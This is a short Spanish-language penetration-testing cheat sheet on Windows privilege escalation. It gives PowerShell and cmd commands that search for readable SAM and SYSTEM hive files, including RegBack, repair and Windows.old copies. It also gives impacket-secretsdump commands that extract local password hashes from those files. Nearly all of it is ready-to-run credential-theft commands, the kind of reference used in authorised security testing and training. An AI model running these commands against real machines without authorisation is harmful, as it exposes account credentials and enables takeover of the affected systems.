---
tags: [privesc, windows, credentials, sam]
---

# SAM & SYSTEM

## Buscar archivos SAM/SYSTEM accesibles

```powershell
@("$env:systemroot\repair\SAM",
  "$env:systemroot\repair\system",
  "$env:systemroot\System32\config\RegBack\SAM",
  "$env:systemroot\System32\config\SAM",
  "$env:systemroot\System32\config\SYSTEM",
  "$env:systemroot\System32\config\RegBack\system") | ForEach-Object {
    if(Test-Path $_){$_}
}
```

```cmd
dir %SYSTEMROOT%\repair\SAM
dir %SYSTEMROOT%\repair\system
dir %SYSTEMROOT%\System32\config\RegBack\SAM
dir %SYSTEMROOT%\System32\config\SAM
dir %SYSTEMROOT%\System32\config\SYSTEM
dir %SYSTEMROOT%\System32\config\RegBack\system
```

## Extraer Hashes

```bash
impacket-secretsdump -sam SAM -system SYSTEM local
```


## Windows.old

Si existe una carpeta `Windows.old` (restos de una actualización previa del SO), puede contener una copia de SAM y SYSTEM de la instalación anterior.

```
C:\Windows.old\Windows\System32\SAM
C:\Windows.old\Windows\System32\SYSTEM
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM local
```
